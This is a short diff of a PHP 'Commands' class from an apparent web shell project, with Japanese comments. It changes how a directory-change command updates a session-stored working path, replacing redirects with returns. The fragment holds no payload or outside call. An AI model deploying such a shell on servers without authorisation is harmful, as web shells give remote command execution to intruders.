@@ -15,15 +15,13 @@ class Commands
         // 引数なしの場合はカレントディレクトリをリセット
         if (! isset($cmd_array[1])) {
             $_SESSION['webshell']['path'] = realpath('./');
-            header("Location: " . $_SERVER['PHP_SELF']);
-            exit();
+            return;
         }
 
         // '/'始まりのパスはそのまま格納
         if (substr($cmd_array[1], 0, 1) === '/') {
             $_SESSION['webshell']['path'] = realpath($cmd_array[1]);
-            header("Location: " . $_SERVER['PHP_SELF']);
-            exit();
+            return;
         }
 
         $_SESSION['webshell']['path'] = realpath($_SESSION['webshell']['path'] . '/' . $cmd_array[1]);
